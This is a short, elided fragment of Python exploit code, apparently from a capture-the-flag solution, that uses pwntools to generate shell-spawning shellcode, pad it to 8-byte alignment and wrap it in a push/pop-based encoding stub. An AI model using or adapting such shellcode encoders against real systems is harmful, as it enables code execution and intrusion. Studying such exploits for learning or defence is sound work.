...
orig_shellcode = asm('add rsp, 0x400\n' + shellcraft.sh())
while len(orig_shellcode) % 8 != 0:
    orig_shellcode += '\x00'
...
while True:
    encoded_shellcode = []
    encoded_shellcode.append('push rdi')
    encoded_shellcode.append('pop rsp')
    for _ in range(pop_count):
        encoded_shellcode.append('pop rdi')
    ...
    while len(encoded_shellcode) % 8 != 0:
        encoded_shellcode += asm('pop rdi')
    new_pop_count = len(encoded_shellcode) / 8 + len(orig_shellcode) / 8
